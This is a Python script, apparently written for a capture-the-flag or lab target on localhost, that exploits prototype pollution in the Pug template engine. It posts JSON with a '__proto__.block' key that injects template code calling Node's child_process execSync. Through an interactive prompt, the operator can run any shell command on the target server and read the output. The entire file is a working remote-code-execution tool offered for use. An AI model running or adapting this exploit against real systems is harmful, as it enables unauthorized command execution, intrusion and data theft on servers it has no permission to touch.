#!/bin/env python

import requests
import json
import sys

def parse_args():
    args = sys.argv    
    config = {}

    if "-u" in args:
        config["url"] = args[args.index("-u") + 1]
    elif "--url" in args:
        config["url"] = args[args.index("--url") + 1]
    else:
        print("error: no url specified")
        sys.exit(-1)

    if "-j" in args or "--json" in args:
        # High level engineering
        try:
            if "-j" in args:
                arg = args[args.index("-j") + 1]
            else:
                arg = args[args.index("--json") + 1]
            config["json"] = json.loads(arg)
        except json.decoder.JSONDecodeError:
            with open(arg,'r') as j:
                config["json"] = json.loads(j.read())

    return config

#url = "http://localhost:1337/api/submit"

def payload(s,json): 
    cmd = (
        "process.mainModule.require('child_process')."
        f"execSync('{s}').toString()"
        )
    cmd = f"pug_html += '\\n' + {cmd} + '\\n'"
    return {
            **json,
            "__proto__.block" : 
                {"type":"Text","line":f"{cmd}"}
            }

def nonempty(s):
    return s != "" and s != '\n'

def run():
    config = parse_args()
    #test request for url validation
    try:
        res = requests.post(config.get("url"))
    except requests.ConnectionError:
        print("invalid url: " + config.get("url"))
        sys.exit(-1)
    cmd = input("\t>")
    while cmd.lower() != 'exit':
        res = requests.post(
                config.get("url"),
                json=payload(cmd,config.get("json",dict())))
        if res.status_code == 200:
            print("\n".join(res.json().get("response").split('\n')[1:-1]))
        else:
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(res.content,'html.parser')
                print("\n".join(filter(nonempty,soup.get_text(separator="\n").split("\n"))))
            except ModuleNotFoundError:
                print(res.text)

        cmd = input("\t>")

def main():
    try:
        run()
        print("\nGoodbye!")
    except EOFError:
        print("\nGoodbye!")
    except KeyboardInterrupt:
        print("\nStopped by user")
        sys.exit(-1)
if __name__ == "__main__":
    main()
